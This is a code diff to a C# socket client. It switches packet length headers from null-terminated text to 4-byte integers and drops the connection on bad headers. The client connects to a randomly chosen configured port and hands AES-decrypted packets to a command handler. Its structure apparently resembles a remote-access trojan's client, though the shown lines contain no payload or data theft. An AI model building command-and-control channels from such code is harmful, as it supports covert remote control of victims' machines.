@@ -4,9 +4,7 @@ using System;
 using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
-using System.Text;
 using System.Threading;
-using System.Security.Cryptography;
 using Client.Handle_Packet;
 using Client.Helper;
 
@@ -41,7 +39,7 @@ namespace Client.Sockets
                     Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
                 Debug.WriteLine("Connected!");
                 Connected = true;
-                Buffer = new byte[1];
+                Buffer = new byte[4];
                 Buffersize = 0;
                 BufferRecevied = false;
                 MS = new MemoryStream();
@@ -101,9 +99,11 @@ namespace Client.Sockets
                 if (Recevied > 0)
                 {
                     if (BufferRecevied == false)
-                        if (Buffer[0] == 0)
+                    {
+                        MS.Write(Buffer, 0, Recevied);
+                        if (MS.Length == 4)
                         {
-                            Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
+                            Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
                             Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
                             MS.Dispose();
                             MS = new MemoryStream();
@@ -114,14 +114,18 @@ namespace Client.Sockets
                             }
                         }
                         else
-                            MS.Write(Buffer, 0, Buffer.Length);
+                        {
+                            Connected = false;
+                            return;
+                        }
+                    }
                     else
                     {
                         MS.Write(Buffer, 0, Recevied);
                         if (MS.Length == Buffersize)
                         {
                             ThreadPool.QueueUserWorkItem(HandlePacket.Read, Settings.aes256.Decrypt(MS.ToArray()));
-                            Buffer = new byte[1];
+                            Buffer = new byte[4];
                             Buffersize = 0;
                             MS.Dispose();
                             MS = new MemoryStream();
@@ -152,7 +156,7 @@ namespace Client.Sockets
                 try
                 {
                     byte[] buffer = Settings.aes256.Encrypt(Msg);
-                    byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + (char)0);
+                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);
 
                     Client.Poll(-1, SelectMode.SelectWrite);
                     Client.BeginSend(buffersize, 0, buffersize.Length, SocketFlags.None, EndSend, null);
